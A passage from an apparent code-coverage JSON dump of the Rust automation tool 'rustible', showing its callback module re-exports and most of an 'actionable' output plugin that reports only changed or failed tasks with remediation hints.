assert!(result.is_success());\n        assert!(!result.has_errors());\n        assert_eq!(result.total_dispatched(), 0);\n\n        result.success_count = 2;\n        result.skipped_count = 1;\n        assert!(result.is_success());\n        assert_eq!(result.total_dispatched(), 2);\n\n        result.errors.push(PluginError {\n            plugin_name: \"test\".to_string(),\n            event: \"test\".to_string(),\n            message: \"error\".to_string(),\n        });\n        assert!(!result.is_success());\n        assert!(result.has_errors());\n        assert_eq!(result.error_count(), 1);\n        assert_eq!(result.total_dispatched(), 3);\n    }\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","home","artur","Repositories","rustible","src","callback","mod.rs"],"content":"//! Callback Plugin System for Rustible Execution Events\n//!\n//! This module provides the callback infrastructure for receiving and\n//! handling execution events during playbook runs. Callbacks can be used\n//! to customize output, collect metrics, integrate with logging systems,\n//! or extend Rustible's functionality.\n//!\n//! # Architecture\n//!\n//! The callback system consists of several key components:\n//!\n//! 1. **[`ExecutionCallback`]** trait: Core trait for receiving execution events\n//! 2. **Built-in Plugins**: Extensive plugin collection in the [`plugins`] submodule\n//!\n//! # Available Plugins\n//!\n//! ## Core Output\n//! - [`DefaultCallback`] - Standard Ansible-like output with colors\n//! - [`MinimalCallback`] - Only failures and recap (ideal for CI/CD)\n//! - [`SummaryCallback`] - Silent execution, comprehensive summary at end\n//! - [`NullCallback`] - No output (useful for testing)\n//!\n//! ## Visual\n//! - [`ProgressCallback`] - Visual progress bars\n//! - [`DiffCallback`] - Before/after diffs for changed files\n//! - [`DenseCallback`] - Compact output format\n//! - [`OnelineCallback`] - One line per task\n//! - [`TreeCallback`] - Tree-structured hierarchical output\n//!\n//! ## Timing \u0026 Analysis\n//! - [`TimerCallback`] - Execution timing with summary\n//! - [`ContextCallback`] - Task context with variables/conditions\n//! - [`StatsCallback`] - Detailed statistics collection\n//! - [`CounterCallback`] - Task counting and tracking\n//!\n//! ## Filtering\n//! - [`SelectiveCallback`] - Filter by status, host, or patterns\n//! - [`SkippyCallback`] - Hide skipped tasks\n//! - [`ActionableCallback`] - Only changed/failed tasks\n//! - [`FullSkipCallback`] - Detailed skip analysis\n//!\n//! ## Logging\n//! - [`JsonCallback`] - JSON-formatted output\n//! - [`YamlCallback`] - YAML-formatted output\n//! - [`LogFileCallback`] - File-based logging\n//! - [`SyslogCallback`] - System syslog integration\n//! - [`DebugCallback`] - Debug output for development\n//!\n//! ## Integration\n//! - [`JUnitCallback`] - JUnit XML reports for CI/CD\n//! - [`MailCallback`] - Email notifications\n//! - [`ForkedCallback`] - Parallel execution output\n//!\n//! # Quick Start with Prelude\n//!\n//! Use the [`prelude`] module for convenient imports:\n//!\n//! ```rust,ignore\n//! use rustible::callback::prelude::*;\n//!\n//! // Default Ansible-like output\n//! let default = DefaultCallback::new();\n//!\n//! // Minimal for CI/CD\n//! let minimal = MinimalCallback::new();\n//!\n//! // Progress bars for interactive use\n//! let progress = ProgressCallback::new();\n//!\n//! // Combine multiple callbacks\n//! let composite = CompositeCallback::new()\n//!     .with_callback(Box::new(ProgressCallback::new()))\n//!     .with_callback(Box::new(DiffCallback::new()));\n//! ```\n//!\n//! # Creating Custom Callbacks\n//!\n//! Implement [`ExecutionCallback`] to create custom callbacks:\n//!\n//! ```rust,ignore\n//! use rustible::callback::prelude::*;\n//! use std::sync::atomic::{AtomicUsize, Ordering};\n//!\n//! #[derive(Debug)]\n//! struct MetricsCallback {\n//!     task_count: AtomicUsize,\n//! }\n//!\n//! #[async_trait]\n//! impl ExecutionCallback for MetricsCallback {\n//!     async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n//!         self.task_count.fetch_add(1, Ordering::SeqCst);\n//!         println!(\"Completed: {} on {} ({:?})\",\n//!             result.task_name,\n//!             result.host,\n//!             result.duration);\n//!     }\n//! }\n//! ```\n//!\n//! [`ExecutionCallback`]: crate::traits::ExecutionCallback\n\npub mod plugins;\n\n// ============================================================================\n// Plugin Re-exports (Flat access for convenience)\n// ============================================================================\n\n// Core output plugins\npub use plugins::NullCallback;\npub use plugins::{\n    DefaultCallback, DefaultCallbackBuilder, DefaultCallbackConfig, HostStats, Verbosity,\n};\npub use plugins::{MinimalCallback, UnreachableCallback};\npub use plugins::{\n    SummaryCallback, SummaryCallbackBuilder, SummaryConfig, SummaryUnreachableCallback,\n};\n\n// Visual plugins\npub use plugins::{count_changes, generate_diff, has_changes};\npub use plugins::{CompositeCallback, DiffCallback, DiffConfig};\npub use plugins::{DenseCallback, DenseConfig};\npub use plugins::{OnelineCallback, OnelineConfig};\npub use plugins::{ProgressCallback, ProgressCallbackBuilder, ProgressConfig};\npub use plugins::{\n    TaskMetadata, TaskResultData, TreeCallback, TreeConfig, TreeHostStats, TreeHostSummary,\n    TreePlaybookSummary, TreeUnreachableCallback,\n};\n\n// Timing \u0026 analysis plugins\npub use plugins::StatsHostStats;\npub use plugins::{\n    ContextCallback, ContextCallbackBuilder, ContextCallbackConfig, ContextVerbosity,\n};\npub use plugins::{CounterCallback, CounterCallbackBuilder, CounterConfig};\npub use plugins::{\n    DurationHistogram, MemorySnapshot, ModuleClassification, ModuleStats, PlayStats, PlaybookStats,\n    StatsCallback, StatsConfig,\n};\npub use plugins::{TimerCallback, TimerCallbackBuilder, TimerConfig, TimerTaskTiming};\n\n// Filtering plugins\npub use plugins::{ActionableCallback, ActionableConfig, ActionableUnreachableCallback};\npub use plugins::{FilterMode, SelectiveBuilder, SelectiveCallback, SelectiveConfig, StatusFilter};\npub use plugins::{FullSkipCallback, FullSkipConfig, HostSkipStats, SkipPattern, SkippedTask};\npub use plugins::{SkippyCallback, SkippyConfig};\n\n// Logging plugins\npub use plugins::JsonHostStats;\npub use plugins::{DebugCallback, DebugConfig};\npub use plugins::{\n    HostLogStats, LogEntry, LogEvent, LogFileCallback, LogFileConfig, LogFileConfigBuilder,\n};\npub use plugins::{JsonCallback, JsonCallbackBuilder, JsonEvent, TaskResultJson};\npub use plugins::{\n    SeverityMapping, SyslogCallback, SyslogConfig, SyslogConfigBuilder, SyslogError,\n    SyslogFacility, SyslogFormat, SyslogResult, SyslogSeverity, SyslogStats,\n};\npub use plugins::{YamlCallback, YamlConfig, YamlConfigBuilder};\n\n// Integration plugins\npub use plugins::{\n    ForkedCallback, ForkedCallbackBuilder, ForkedConfig, ForkedUnreachableCallback, HostState,\n};\npub use plugins::{JUnitCallback, JUnitUnreachableCallback};\npub use plugins::{MailCallback, MailConfig, MailConfigBuilder, MailUnreachableCallback, TlsMode};\n\n// ============================================================================\n// Type Aliases\n// ============================================================================\n\n/// A boxed callback for dynamic dispatch.\n///\n/// Use this when you need to store callbacks in a collection with different types.\npub type BoxedCallback = Box\u003cdyn crate::traits::ExecutionCallback\u003e;\n\n/// A shared callback wrapped in Arc for thread-safe shared ownership.\n///\n/// This is the recommended pattern for callbacks used across multiple tasks.\npub type SharedCallback = std::sync::Arc\u003cdyn crate::traits::ExecutionCallback\u003e;\n\n// ============================================================================\n// Prelude Module\n// ============================================================================\n\n/// Convenient re-exports for callback development and usage.\n///\n/// This prelude provides everything needed to work with the callback system:\n///\n/// - **Core Traits**: [`ExecutionCallback`], [`ExecutionResult`], [`ModuleResult`]\n/// - **Output Plugins**: [`DefaultCallback`], [`MinimalCallback`], [`SummaryCallback`], [`NullCallback`]\n/// - **Visual Plugins**: [`ProgressCallback`], [`DiffCallback`], [`CompositeCallback`]\n/// - **Timing Plugins**: [`TimerCallback`], [`ContextCallback`], [`StatsCallback`]\n/// - **Filtering Plugins**: [`SelectiveCallback`], [`SkippyCallback`], [`ActionableCallback`]\n/// - **Logging Plugins**: [`JsonCallback`], [`YamlCallback`], [`LogFileCallback`], [`SyslogCallback`]\n/// - **Integration Plugins**: [`JUnitCallback`], [`MailCallback`]\n/// - **Type Aliases**: [`SharedCallback`], [`BoxedCallback`]\n///\n/// # Example\n///\n/// ```rust,ignore\n/// use rustible::callback::prelude::*;\n///\n/// // Create and configure callbacks\n/// let default = DefaultCallback::new();\n/// let timer = TimerCallback::builder().show_per_task(true).build();\n///\n/// // Combine them\n/// let composite = CompositeCallback::new()\n///     .with_callback(Box::new(default))\n///     .with_callback(Box::new(timer));\n/// ```\n///\n/// [`ExecutionCallback`]: crate::traits::ExecutionCallback\n/// [`ExecutionResult`]: crate::traits::ExecutionResult\n/// [`ModuleResult`]: crate::traits::ModuleResult\npub mod prelude {\n    // ========================================================================\n    // Core Traits\n    // ========================================================================\n\n    pub use crate::traits::ExecutionCallback;\n    pub use crate::traits::ExecutionResult;\n    pub use crate::traits::ModuleResult;\n\n    // ========================================================================\n    // Core Output Plugins\n    // ========================================================================\n\n    pub use super::DefaultCallback;\n    pub use super::DefaultCallbackBuilder;\n    pub use super::DefaultCallbackConfig;\n    pub use super::HostStats;\n    pub use super::MinimalCallback;\n    pub use super::NullCallback;\n    pub use super::SummaryCallback;\n    pub use super::SummaryCallbackBuilder;\n    pub use super::SummaryConfig;\n    pub use super::UnreachableCallback;\n    pub use super::Verbosity;\n\n    // ========================================================================\n    // Visual Plugins\n    // ========================================================================\n\n    pub use super::CompositeCallback;\n    pub use super::DenseCallback;\n    pub use super::DenseConfig;\n    pub use super::DiffCallback;\n    pub use super::DiffConfig;\n    pub use super::OnelineCallback;\n    pub use super::OnelineConfig;\n    pub use super::ProgressCallback;\n    pub use super::ProgressCallbackBuilder;\n    pub use super::ProgressConfig;\n    pub use super::TreeCallback;\n    pub use super::TreeConfig;\n    pub use super::{count_changes, generate_diff, has_changes};\n\n    // ========================================================================\n    // Timing \u0026 Analysis Plugins\n    // ========================================================================\n\n    pub use super::ContextCallback;\n    pub use super::ContextCallbackBuilder;\n    pub use super::ContextCallbackConfig;\n    pub use super::ContextVerbosity;\n    pub use super::CounterCallback;\n    pub use super::CounterConfig;\n    pub use super::StatsCallback;\n    pub use super::StatsConfig;\n    pub use super::TimerCallback;\n    pub use super::TimerCallbackBuilder;\n    pub use super::TimerConfig;\n    pub use super::TimerTaskTiming;\n\n    // ========================================================================\n    // Filtering Plugins\n    // ========================================================================\n\n    pub use super::ActionableCallback;\n    pub use super::ActionableConfig;\n    pub use super::FilterMode;\n    pub use super::FullSkipCallback;\n    pub use super::FullSkipConfig;\n    pub use super::SelectiveBuilder;\n    pub use super::SelectiveCallback;\n    pub use super::SelectiveConfig;\n    pub use super::SkippedTask;\n    pub use super::SkippyCallback;\n    pub use super::SkippyConfig;\n    pub use super::StatusFilter;\n\n    // ========================================================================\n    // Logging Plugins\n    // ========================================================================\n\n    pub use super::DebugCallback;\n    pub use super::DebugConfig;\n    pub use super::JsonCallback;\n    pub use super::JsonCallbackBuilder;\n    pub use super::LogFileCallback;\n    pub use super::LogFileConfig;\n    pub use super::SyslogCallback;\n    pub use super::SyslogConfig;\n    pub use super::SyslogFacility;\n    pub use super::SyslogSeverity;\n    pub use super::YamlCallback;\n    pub use super::YamlConfig;\n\n    // ========================================================================\n    // Integration Plugins\n    // ========================================================================\n\n    pub use super::ForkedCallback;\n    pub use super::ForkedConfig;\n    pub use super::JUnitCallback;\n    pub use super::MailCallback;\n    pub use super::MailConfig;\n\n    // ========================================================================\n    // Type Aliases\n    // ========================================================================\n\n    pub use super::BoxedCallback;\n    pub use super::SharedCallback;\n\n    // ========================================================================\n    // Common Dependencies\n    // ========================================================================\n\n    pub use async_trait::async_trait;\n    pub use std::sync::Arc;\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","actionable.rs"],"content":"//! Actionable Callback Plugin for Rustible\n//!\n//! A callback plugin focused on actionable output - only showing tasks that\n//! did something (changed or failed), hiding ok and skipped tasks entirely.\n//! Perfect for answering \"what changed?\" questions and getting clear action\n//! items for failures.\n//!\n//! # Features\n//!\n//! - **Actionable Focus**: Only shows tasks that made changes or failed\n//! - **Clean Output**: Hides ok and skipped tasks for noise-free logs\n//! - **Action Suggestions**: Provides remediation hints for common failures\n//! - **Change Summary**: Quick overview of what changed across all hosts\n//! - **Duration Tracking**: Optional timing for changed/failed tasks\n//!\n//! # Use Cases\n//!\n//! - Reviewing what changed after a playbook run\n//! - Auditing and change tracking\n//! - Quick identification of failures needing attention\n//! - Environments where most tasks are idempotent (no-op)\n//!\n//! # Example Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::actionable::{ActionableCallback, ActionableConfig};\n//!\n//! // Basic usage with defaults\n//! let callback = ActionableCallback::new();\n//!\n//! // Custom configuration\n//! let callback = ActionableCallback::with_config(ActionableConfig {\n//!     show_action_suggestions: true,\n//!     show_duration: true,\n//!     ..Default::default()\n//! });\n//!\n//! executor.with_callback(Box::new(callback));\n//! ```\n//!\n//! # Example Output\n//!\n//! ```text\n//! PLAY [Configure web servers] *************************************************\n//!\n//! CHANGED: webserver1 | Install nginx | Package installed successfully\n//! CHANGED: webserver1 | Configure nginx | Configuration updated\n//! FAILED: webserver2 | Install nginx | Package installation failed: apt-get returned 100\n//!   ACTION REQUIRED: Check package sources and network connectivity\n//! CHANGED: dbserver1 | Update PostgreSQL config | Configuration modified\n//!\n//! PLAY RECAP ********************************************************************\n//! webserver1                 : ok=5    changed=2    failed=0    skipped=1\n//! webserver2                 : ok=3    changed=0    failed=1    skipped=0\n//! dbserver1                  : ok=8    changed=1    failed=0    skipped=2\n//!\n//! SUMMARY: 2 hosts changed, 1 host failed\n//! ```\n//!\n//! # Exit Code Mapping\n//!\n//! - `0` - No failures, changes were made successfully\n//! - `1` - One or more tasks failed\n//! - `2` - One or more hosts were unreachable\n//! - `3` - Both failures and unreachable hosts\n\nuse std::collections::HashMap;\nuse std::sync::Arc;\nuse std::time::Instant;\n\nuse async_trait::async_trait;\nuse colored::Colorize;\nuse parking_lot::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n// ============================================================================\n// Configuration\n// ============================================================================\n\n/// Configuration options for the actionable callback.\n#[derive(Debug, Clone)]\npub struct ActionableConfig {\n    /// Whether to show play headers\n    pub show_play_headers: bool,\n    /// Whether to provide action suggestions for failures\n    pub show_action_suggestions: bool,\n    /// Whether to show a summary of changes at the end\n    pub show_change_summary: bool,\n    /// Whether to show task duration for changed/failed tasks\n    pub show_duration: bool,\n    /// Whether to use ANSI colors in output\n    pub use_colors: bool,\n    /// Minimum width for host name column in recap\n    pub host_column_width: usize,\n    /// Whether to show the recap at the end\n    pub show_recap: bool,\n}\n\nimpl Default for ActionableConfig {\n    fn default() -\u003e Self {\n        Self {\n            show_play_headers: true,\n            show_action_suggestions: true,\n            show_change_summary: true,\n            show_duration: false,\n            use_colors: true,\n            host_column_width: 30,\n            show_recap: true,\n        }\n    }\n}\n\nimpl ActionableConfig {\n    /// Creates a minimal configuration for truly quiet output.\n    ///\n    /// Only shows changed and failed tasks with no frills.\n    pub fn minimal() -\u003e Self {\n        Self {\n            show_play_headers: false,\n            show_action_suggestions: false,\n            show_change_summary: false,\n            show_duration: false,\n            use_colors: true,\n            host_column_width: 30,\n            show_recap: false,\n        }\n    }\n\n    /// Creates a verbose configuration with all features enabled.\n    pub fn verbose() -\u003e Self {\n        Self {\n            show_play_headers: true,\n            show_action_suggestions: true,\n            show_change_summary: true,\n            show_duration: true,\n            use_colors: true,\n            host_column_width: 30,\n            show_recap: true,\n        }\n    }\n\n    /// Creates a CI-friendly configuration (no colors).\n    pub fn ci() -\u003e Self {\n        Self {\n            show_play_headers: true,\n            show_action_suggestions: true,\n            show_change_summary: true,\n            show_duration: false,\n            use_colors: false,\n            host_column_width: 30,\n            show_recap: true,\n        }\n    }\n}\n\n// ============================================================================\n// Host Statistics\n// ============================================================================\n\n/// Statistics tracked per host during execution.\n#[derive(Debug, Clone, Default)]\nstruct HostStats {\n    /// Count of successful tasks (no changes)\n    ok: u32,\n    /// Count of tasks that made changes\n    changed: u32,\n    /// Count of failed tasks\n    failed: u32,\n    /// Count of skipped tasks\n    skipped: u32,\n    /// Count of unreachable attempts\n    unreachable: u32,\n}\n\nimpl HostStats {\n    /// Returns true if any actionable events occurred (changes or failures)\n    #[allow(dead_code)]\n    fn has_actions(\u0026self) -\u003e bool {\n        self.changed \u003e 0 || self.failed \u003e 0 || self.unreachable \u003e 0\n    }\n\n    /// Returns true if any failures occurred\n    fn has_failures(\u0026self) -\u003e bool {\n        self.failed \u003e 0 || self.unreachable \u003e 0\n    }\n}\n\n// ============================================================================\n// Actionable Callback Implementation\n// ============================================================================\n\n/// Actionable callback plugin that shows only tasks that made changes or failed.\n///\n/// This callback is designed for operators who want to quickly understand\n/// what changed during a playbook run, without wading through \"ok\" messages.\n///\n/// # Design Principles\n///\n/// 1. **Actionable Output**: Only show things that require attention or review\n/// 2. **Change Visibility**: Changes are highlighted so you know what was modified\n/// 3. **Clear Failures**: Failed tasks include suggestions for remediation\n/// 4. **Quiet Success**: Ok and skipped tasks produce no output\n///\n/// # Usage\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::actionable::ActionableCallback;\n///\n/// let callback = ActionableCallback::new();\n/// executor.with_callback(Box::new(callback));\n/// ```\n#[derive(Debug)]\npub struct ActionableCallback {\n    /// Configuration\n    config: ActionableConfig,\n    /// Per-host execution statistics\n    host_stats: Arc\u003cRwLock\u003cHashMap\u003cString, HostStats\u003e\u003e\u003e,\n    /// Playbook start time for duration tracking\n    start_time: RwLock\u003cOption\u003cInstant\u003e\u003e,\n    /// Current playbook name\n    playbook_name: RwLock\u003cOption\u003cString\u003e\u003e,\n    /// Current play name\n    current_play: RwLock\u003cOption\u003cString\u003e\u003e,\n    /// Whether any actionable events occurred\n    has_actions: RwLock\u003cbool\u003e,\n    /// Total task count\n    task_count: RwLock\u003cu32\u003e,\n}\n\nimpl ActionableCallback {\n    /// Creates a new actionable callback plugin with default configuration.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let callback = ActionableCallback::new();\n    /// ```\n    #[must_use]\n    pub fn new() -\u003e Self {\n        Self::with_config(ActionableConfig::default())\n    }\n\n    /// Creates a new actionable callback plugin with custom configuration.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let config = ActionableConfig {\n    ///     show_duration: true,\n    ///     ..Default::default()\n    /// };\n    /// let callback = ActionableCallback::with_config(config);\n    /// ```\n    #[must_use]\n    pub fn with_config(config: ActionableConfig) -\u003e Self {\n        Self {\n            config,\n            host_stats: Arc::new(RwLock::new(HashMap::new())),\n            start_time: RwLock::new(None),\n            playbook_name: RwLock::new(None),\n            current_play: RwLock::new(None),\n            has_actions: RwLock::new(false),\n            task_count: RwLock::new(0),\n        }\n    }\n\n    /// Returns whether any actionable events occurred during execution.\n    ///\n    /// Useful for determining if the playbook made any changes.\n    pub fn has_actions(\u0026self) -\u003e bool {\n        *self.has_actions.read()\n    }\n\n    /// Returns the count of hosts that had changes.\n    pub fn hosts_with_changes(\u0026self) -\u003e u32 {\n        self.host_stats\n            .read()\n            .values()\n            .filter(|s| s.changed \u003e 0)\n            .count() as u32\n    }\n\n    /// Returns the count of hosts that had failures.\n    pub fn hosts_with_failures(\u0026self) -\u003e u32 {\n        self.host_stats\n            .read()\n            .values()\n            .filter(|s| s.has_failures())\n            .count() as u32\n    }\n\n    /// Get the suggested exit code based on execution results.\n    pub fn exit_code(\u0026self) -\u003e i32 {\n        let stats = self.host_stats.read();\n        let has_failures = stats.values().any(|s| s.failed \u003e 0);\n        let has_unreachable = stats.values().any(|s| s.unreachable \u003e 0);\n\n        match (has_failures, has_unreachable) {\n            (true, true) =\u003e 3,\n            (false, true) =\u003e 2,\n            (true, false) =\u003e 1,\n            (false, false) =\u003e 0,\n        }\n    }\n\n    /// Formats a changed task message.\n    fn format_changed(\n        \u0026self,\n        host: \u0026str,\n        task_name: \u0026str,\n        message: \u0026str,\n        duration_ms: Option\u003cu128\u003e,\n    ) -\u003e String {\n        let duration_str = duration_ms\n            .map(|d| format!(\" ({:.2}s)\", d as f64 / 1000.0))\n            .unwrap_or_default();\n\n        if self.config.use_colors {\n            format!(\n                \"{}: {} | {} | {}{}\",\n                \"CHANGED\".yellow().bold(),\n                host.bright_white().bold(),\n                task_name.cyan(),\n                message,\n                duration_str.bright_black()\n            )\n        } else {\n            format!(\n                \"CHANGED: {} | {} | {}{}\",\n                host, task_name, message, duration_str\n            )\n        }\n    }\n\n    /// Formats a failed task message.\n    fn format_failed(\u0026self, host: \u0026str, task_name: \u0026str, message: \u0026str) -\u003e String {\n        if self.config.use_colors {\n            format!(\n                \"{}: {} | {} | {}\",\n                \"FAILED\".red().bold(),\n                host.bright_white().bold(),\n                task_name.cyan(),\n                message.red()\n            )\n        } else {\n            format!(\"FAILED: {} | {} | {}\", host, task_name, message)\n        }\n    }\n\n    /// Formats an unreachable host message.\n    fn format_unreachable(\u0026self, host: \u0026str, task_name: \u0026str, message: \u0026str) -\u003e String {\n        if self.config.use_colors {\n            format!(\n                \"{}: {} | {} | {}\",\n                \"UNREACHABLE\".magenta().bold(),\n                host.bright_white().bold(),\n                task_name.cyan(),\n                message\n            )\n        } else {\n            format!(\"UNREACHABLE: {} | {} | {}\", host, task_name, message)\n        }\n    }\n\n    /// Generates action suggestions based on failure message.\n    fn suggest_action(message: \u0026str) -\u003e Option\u003cString\u003e {\n        let lower = message.to_lowercase();\n\n        if lower.contains(\"permission denied\") || lower.contains(\"access denied\") {\n            Some(\"Check file permissions and user privileges. Consider using become: true\".into())\n        } else if lower.contains(\"no such file\") || lower.contains(\"file not found\") {\n            Some(\"Verify the file path exists. Check for typos in the path\".into())\n        } else if lower.contains(\"connection refused\")\n            || lower.contains(\"unreachable\")\n            || lower.contains(\"timed out\")\n        {\n            Some(\"Check network connectivity and firewall rules. Verify the host is running\".into())\n        } else if lower.contains(\"package\")\n            \u0026\u0026 (lower.contains(\"not found\") || lower.contains(\"failed\"))\n        {\n            Some(\n                \"Check package sources and network connectivity. Verify package name is correct\"\n                    .into(),\n            )\n        } else if lower.contains(\"authentication\") || lower.contains(\"credentials\") {\n            Some(\"Verify authentication credentials. Check SSH keys or passwords\".into())\n        } else if lower.contains(\"disk\") \u0026\u0026 lower.contains(\"space\") {\n            Some(\"Free up disk space on the target host\".into())\n        } else if lower.contains(\"memory\") || lower.contains(\"oom\") {\n            Some(\"Check available memory on the target host\".into())\n        } else if lower.contains(\"syntax error\") || lower.contains(\"parse error\") {\n            Some(\"Review the task configuration for syntax errors\".into())\n        } else if lower.contains(\"service\") \u0026\u0026 lower.contains(\"failed\") {\n            Some(\"Check service logs: journalctl -u \u003cservice\u003e or /var/log\".into())\n        } else if lower.contains(\"command not found\") || lower.contains(\"executable not found\") {\n            Some(\"Install the required command/package or check PATH\".into())\n        } else if lower.contains(\"timeout\") {\n            Some(\"Increase timeout value or check for slow operations\".into())\n        } else {\n            None\n        }\n    }\n\n    /// Formats a single host's recap line.\n    fn format_recap_line(\u0026self, host: \u0026str, stats: \u0026HostStats) -\u003e String {\n        let width = self.config.host_column_width;\n\n        if self.config.use_colors {\n            let host_color = if stats.failed \u003e 0 || stats.unreachable \u003e 0 {\n                host.red().bold()\n            } else if stats.changed \u003e 0 {\n                host.yellow()\n            } else {\n                host.green()\n            };\n\n            // Format each stat with appropriate color\n            let ok_str = if stats.ok \u003e 0 {\n                format!(\"ok={}\", stats.ok.to_string().green())\n            } else {\n                format!(\"ok={}\", stats.ok)\n            };\n\n            let changed_str = if stats.changed \u003e 0 {\n                format!(\"changed={}\", stats.changed.to_string().yellow().bold())\n            } else {\n                format!(\"changed={}\", stats.changed)\n            };\n\n            let failed_str = if stats.failed \u003e 0 {\n                format!(\"failed={}\", stats.failed.to_string().red().bold())\n            } else {\n                format!(\"failed={}\", stats.failed)\n            };\n\n            let skipped_str = format!(\"skipped={}\", stats.skipped);\n\n            let unreachable_str = if stats.unreachable \u003e 0 {\n                format!(\n                    \"unreachable={}\",\n                    stats.unreachable.to_string().magenta().bold()\n                )\n            } else {\n                format!(\"unreachable={}\", stats.unreachable)\n            };\n\n            format!(\n                \"{:\u003cwidth$} : {}    {}    {}    {}    {}\",\n                host_color, ok_str, changed_str, failed_str, skipped_str, unreachable_str\n            )\n        } else {\n            format!(\n                \"{:\u003cwidth$} : ok={}    changed={}    failed={}    skipped={}    unreachable={}\",\n                host, stats.ok, stats.changed, stats.failed, stats.skipped, stats.unreachable\n            )\n        }\n    }\n\n    /// Prints the action suggestion for a failure.\n    fn print_action_suggestion(\u0026self, message: \u0026str) {\n        if self.config.show_action_suggestions {\n            if let Some(suggestion) = Self::suggest_action(message) {\n                if self.config.use_colors {\n                    println!(\n                        \"  {}: {}\",\n                        \"ACTION REQUIRED\".red().bold(),\n                        suggestion.yellow()\n                    );\n                } else {\n                    println!(\"  ACTION REQUIRED: {}\", suggestion);\n                }\n            }\n        }\n    }\n}\n\nimpl Default for ActionableCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for ActionableCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            host_stats: Arc::clone(\u0026self.host_stats),\n            start_time: RwLock::new(*self.start_time.read()),\n            playbook_name: RwLock::new(self.playbook_name.read().clone()),\n            current_play: RwLock::new(self.current_play.read().clone()),\n            has_actions: RwLock::new(*self.has_actions.read()),\n            task_count: RwLock::new(*self.task_count.read()),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for ActionableCallback {\n    /// Called when a playbook starts - initializes tracking state.\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        *self.start_time.write() = Some(Instant::now());\n        *self.playbook_name.write() = Some(name.to_string());\n\n        // Clear stats from any previous run\n        self.host_stats.write().clear();\n        *self.has_actions.write() = false;\n        *self.task_count.write() = 0;\n    }\n\n    /// Called when a playbook ends - prints the final recap and summary.\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let stats = self.host_stats.read();\n        let start_time = *self.start_time.read();\n\n        // Print recap if configured\n        if self.config.show_recap \u0026\u0026 !stats.is_empty() {\n            let separator = \"*\".repeat(62);\n            if self.config.use_colors {\n                println!(\n                    \"\\n{} {}\",\n                    \"PLAY RECAP\".bright_white().bold(),\n                    separator.bright_black()\n                );\n            } else {\n                println!(\"\\nPLAY RECAP {}\", separator);\n            }\n\n            // Print recap for each host in sorted order\n            let mut hosts: Vec\u003c_\u003e = stats.keys().collect();\n            hosts.sort();\n\n            for host in hosts {\n                if let Some(host_stats) = stats.get(host) {\n                    println!(\"{}\", self.format_recap_line(host, host_stats));\n                }\n            }\n        }\n\n        // Print change summary if configured\n        if self.config.show_change_summary {\n            let total_changed = stats.values().filter(|s| s.changed \u003e 0).count();\n            let total_failed = stats.values().filter(|s| s.has_failures()).count();\n\n            println!();\n\n            let summary = if total_failed \u003e 0 {\n                if self.config.use_colors {\n                    format!(\n                        \"{}: {} host(s) changed, {} host(s) failed\",\n                        \"SUMMARY\".bright_white().bold(),\n                        total_changed.to_string().yellow(),\n                        total_failed.to_string().red().bold()\n                    )\n                } else {\n                    format!(\n                        \"SUMMARY: {} host(s) changed, {} host(s) failed\",\n                        total_changed, total_failed\n                    )\n                }\n            } else if total_changed \u003e 0 {\n                if self.config.use_colors {\n                    format!(\n                        \"{}: {} host(s) changed, all successful\",\n                        \"SUMMARY\".bright_white().bold(),\n                        total_changed.to_string().yellow()\n                    )\n                } else {\n                    format!(\"SUMMARY: {} host(s) changed, all successful\", total_changed)\n                }\n            } else {\n                if self.config.use_colors {\n                    format!(\n                        \"{}: No changes made (all tasks ok or skipped)\",\n                        \"SUMMARY\".bright_white().bold()\n                    )\n                } else {\n                    \"SUMMARY: No changes made (all tasks ok or skipped)\".to_string()\n                }\n            };\n\n            println!(\"{}\", summary);\n        }\n\n        // Print duration if we have start time\n        if let Some(start) = start_time {\n            let duration = start.elapsed();\n            if self.config.use_colors {\n                let status = if success {\n                    \"completed successfully\".green()\n                } else {\n                    \"failed\".red().bold()\n                };\n                println!(\n                    \"\\n{} {} in {:.2}s\",\n                    name.bright_white().bold(),\n                    status,\n                    duration.as_secs_f64()\n                );\n            } else {\n                let status = if success {\n                    \"completed successfully\"\n                } else {\n                    \"failed\"\n                };\n                println!(\"\\n{} {} in {:.2}s\", name, status, duration.as_secs_f64());\n            }\n        }\n    }\n\n    /// Called when a play starts - shows play header if configured.\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        // Initialize stats for all hosts in this play\n        let mut stats = self.host_stats.write();\n        for host in hosts {\n            stats.entry(host.clone()).or_default();\n        }\n\n        // Store current play name\n        *self.current_play.write() = Some(name.to_string());\n\n        // Show play header if configured\n        if self.config.show_play_headers {\n            let separator = \"*\".repeat(50);\n            if self.config.use_colors {\n                println!(\n                    \"\\n{} [{}] {}\",\n                    \"PLAY\".bright_white().bold(),\n                    name.cyan(),\n                    separator.bright_black()\n                );\n            } else {\n                println!(\"\\nPLAY [{}] {}\", name, separator);\n            }\n        }\n    }\n\n    /// Called when a play ends - silent in actionable mode.\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Silent - recap is shown at playbook end\n    }\n\n    /// Called when a task starts - silent in actionable mode.\n    async fn on_task_start(\u0026self, _name: \u0026str, _host: \u0026str) {\n        // Silent - we only show output on change or failure\n        *self.task_count.write() += 1;\n    }\n\n    /// Called when a task completes - only shows output on change or failure.\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let mut stats = self.host_stats.write();\n        let host_stats = stats.entry(result.host.clone()).or_default();\n\n        // Update statistics based on result\n        if result.result.skipped {\n            host_stats.skipped += 1;\n            // Silent on skip - this is the core behavior of actionable callback\n        } else if !result.result.success {\n            host_stats.failed += 1;\n\n            // Mark that we have actions\n            *self.has_actions.write() = true;\n\n            // Print failure immediately\n            let message = 